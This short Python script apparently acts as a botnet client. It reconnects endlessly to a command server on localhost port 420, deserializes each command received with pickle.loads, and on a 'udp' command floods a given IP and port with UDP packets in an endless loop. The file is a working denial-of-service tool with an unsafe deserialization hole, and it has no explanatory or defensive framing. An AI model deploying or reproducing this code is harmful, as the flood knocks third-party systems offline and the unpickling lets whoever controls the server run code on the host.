import socket
import pickle

# creates and connects a socket
def create():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            sock.connect(("localhost", 420))
            print("connected to server!")
            return sock
        except:
            print("connection failed!")

def udp_flood(ip, port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        sock.sendto(message.encode("utf-8"), (ip, port))

def yes():
    sock = create()

    while True:
        try:
            command = sock.recv(1024)
            try:
                command = pickle.loads(command)
                print(command)

                if command[0] == "msg":
                    print(command[0])
                elif command[0] == "udp":
                    udp_flood(command[1], command[2], command[3])
            except:
                pass
        except:
            sock = create()

yes()